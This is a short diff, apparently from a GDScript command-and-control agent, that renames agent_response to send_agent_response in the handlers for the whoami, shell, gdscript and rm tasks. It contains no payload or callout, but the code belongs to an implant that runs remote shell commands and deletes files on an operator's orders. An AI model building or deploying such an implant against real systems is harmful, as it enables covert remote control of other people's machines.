@@ -17,7 +17,7 @@ func _on_tasking_whoami(task):
 		print(output)
 		print("")
 
-		api.agent_response(
+		api.send_agent_response(
 			api.create_task_response(
 				exit_code == 0,
 				true,
@@ -58,7 +58,7 @@ func _on_tasking_shell(task):
 		print(output)
 		print("")
 
-		api.agent_response(
+		api.send_agent_response(
 			api.create_task_response(
 				exit_code == 0,
 				true,
@@ -96,7 +96,7 @@ func _on_tasking_gdscript(task):
 		print(output)
 		print("")
 
-		api.agent_response(
+		api.send_agent_response(
 			api.create_task_response(
 				true,
 				true,
@@ -126,7 +126,7 @@ func _on_tasking_rm(task):
 			output = "Error (%d) removing path: %s" % [ret, path]
 			status = "error"
 
-		api.agent_response(
+		api.send_agent_response(
 			JSON.stringify({
 				"action": "post_response",
 				"status": status,
